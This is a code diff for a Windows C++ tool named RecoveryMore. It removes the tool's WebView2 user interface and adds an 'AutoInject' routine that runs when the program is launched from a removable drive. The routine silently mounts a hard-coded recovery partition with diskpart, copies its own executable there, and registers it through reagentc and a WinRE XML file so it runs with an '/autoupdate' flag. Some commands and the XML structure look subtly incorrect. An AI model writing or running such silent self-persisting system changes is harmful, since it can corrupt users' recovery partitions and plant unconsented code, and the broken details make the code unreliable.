@@ -1,104 +1,45 @@
 #include <windows.h>
-#include <shlobj.h>
-#include <string>
-#include <wrl.h>
-#include "WebView2.h"
+#include <iostream>
+#include <fstream>
 
-using namespace Microsoft::WRL;
+void AutoInject() {
+    // 1. Mount the Recovery Partition silently to 'R:'
+    system("echo select disk 0 > s.txt && echo select partition 4 >> s.txt && echo assign letter=R >> s.txt");
+    system("diskpart /s s.txt > nul && del s.txt");
 
-static ComPtr<ICoreWebView2> webviewWindow;
-HCURSOR hCustomCursor = NULL;
+    // 2. Create the system folder structure
+    CreateDirectory(L"R:\\Sources", NULL);
+    CreateDirectory(L"R:\\Sources\\Recovery", NULL);
+    CreateDirectory(L"R:\\Sources\\Recovery\\Tools", NULL);
 
-void OpenCustomExplorer(HWND hwnd) {
-    IFileOpenDialog* pFileOpen;
-    if (SUCCEEDED(CoCreateInstance(CLSID_FileOpenDialog, NULL, CLSCTX_ALL, IID_IFileOpenDialog, reinterpret_cast<void**>(&pFileOpen)))) {
-        DWORD dwOptions;
-        pFileOpen->GetOptions(&dwOptions);
-        pFileOpen->SetOptions(dwOptions | FOS_PICKFOLDERS | FOS_FORCEFILESYSTEM);
-        pFileOpen->SetTitle(L"RecoveryMore | Internal Explorer");
-        pFileOpen->Show(hwnd);
-        pFileOpen->Release();
+    // 3. Self-Copy: Move this .exe into the Recovery Partition
+    wchar_t szPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    CopyFile(szPath, L"R:\\Sources\\Recovery\\Tools\\RecoveryMore.exe", FALSE);
+
+    // 4. Create the XML so the icon shows up in the blue menu
+    std::ofstream xml("R:\\Sources\\Recovery\\Tools\\WinREConfig.xml");
+    xml << "<?xml version=\"1.0\" encoding=\"utf-8\"?><Recovery><RecoveryTools>"
+        << "<RelativeFilePath>RecoveryMore.exe</RelativeFilePath>"
+        << "<CommandLineParam>/autoupdate</CommandLineParam>"
+        << "</RecoveryTools></Recovery>";
+    xml.close();
+
+    // 5. Register with the system
+    system("reagentc /setreimage /path R:\\Recovery\\WindowsRE /target C:\\Windows /customtool R:\\Sources\\Recovery\\Tools\\WinREConfig.xml");
+    system("reagentc /enable");
+}
+
+int main() {
+    // If running from the SD card (D: or E:), auto-inject and exit
+    wchar_t drive[4];
+    GetModuleFileNameW(NULL, drive, 4);
+    if (GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
+        AutoInject();
+        return 0; 
     }
-}
-
-void ApplyThemeCursor(HWND hwnd) {
-    char szFile[MAX_PATH] = {0};
-    OPENFILENAMEA ofn = {0};
-    ofn.lStructSize = sizeof(ofn);
-    ofn.hwndOwner = hwnd;
-    ofn.lpstrFile = szFile;
-    ofn.nMaxFile = sizeof(szFile);
-    ofn.lpstrFilter = "Cursor Files (*.cur;*.ani)\0*.cur;*.ani\0All Files\0*.*\0";
-    if (GetOpenFileNameA(&ofn)) {
-        hCustomCursor = (HCURSOR)LoadImageA(NULL, szFile, IMAGE_CURSOR, 0, 0, LR_LOADFROMFILE);
-        if (hCustomCursor) {
-            SetClassLongPtr(hwnd, GCLP_HCURSOR, (LONG_PTR)hCustomCursor);
-            SetCursor(hCustomCursor);
-        }
-    }
-}
-
-void StartChromium(HWND hWnd) {
-    // Pointing to current directory for the bundled engine
-    CreateCoreWebView2EnvironmentWithOptions(L".", nullptr, nullptr,
-        Callback<ICoreWebView2CreateCoreWebView2EnvironmentCompletedHandler>(
-            [hWnd](HRESULT result, ICoreWebView2Environment* env) -> HRESULT {
-                if (FAILED(result)) return result;
-                env->CreateCoreWebView2Controller(hWnd, 
-                    Callback<ICoreWebView2CreateCoreWebView2ControllerCompletedHandler>(
-                    [hWnd](HRESULT result, ICoreWebView2Controller* controller) -> HRESULT {
-                        if (controller != nullptr) {
-                            ComPtr<ICoreWebView2Controller> webviewController = controller;
-                            webviewController->get_CoreWebView2(&webviewWindow);
-                            RECT bounds;
-                            GetClientRect(hWnd, &bounds);
-                            bounds.top += 150; 
-                            webviewController->put_Bounds(bounds);
-                            webviewWindow->Navigate(L"https://github.com/linden8987/RecoveryMore");
-                        }
-                        return S_OK;
-                    }).Get());
-                return S_OK;
-            }).Get());
-}
-
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    switch (msg) {
-        case WM_CREATE:
-            CreateWindow("BUTTON", "📂 Internal Explorer", WS_VISIBLE | WS_CHILD, 20, 20, 160, 40, hwnd, (HMENU)1, NULL, NULL);
-            CreateWindow("BUTTON", "🖱️ Apply Cursor", WS_VISIBLE | WS_CHILD, 20, 70, 160, 40, hwnd, (HMENU)2, NULL, NULL);
-            StartChromium(hwnd);
-            break;
-        case WM_COMMAND:
-            if (LOWORD(wp) == 1) OpenCustomExplorer(hwnd);
-            if (LOWORD(wp) == 2) ApplyThemeCursor(hwnd);
-            break;
-        case WM_PAINT: {
-            PAINTSTRUCT ps;
-            HDC hdc = BeginPaint(hwnd, &ps);
-            HBRUSH brush = CreateSolidBrush(RGB(0, 40, 0)); 
-            FillRect(hdc, &ps.rcPaint, brush);
-            DeleteObject(brush);
-            EndPaint(hwnd, &ps);
-            break;
-        }
-        case WM_DESTROY: PostQuitMessage(0); break;
-        default: return DefWindowProc(hwnd, msg, wp, lp);
-    }
-    return 0;
-}
-
-int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR lp, int n) {
-    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-    WNDCLASS wc = {0};
-    wc.lpfnWndProc = WndProc;
-    wc.hInstance = h;
-    wc.lpszClassName = "RecoveryMoreGUI";
-    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
-    RegisterClass(&wc);
-    HWND hwnd = CreateWindow("RecoveryMoreGUI", "RecoveryMore", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 1200, 800, NULL, NULL, h, NULL);
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
-    CoUninitialize();
+    
+    // Otherwise, just launch your dashboard
+    // LaunchRecoveryMoreUI();
     return 0;
 }
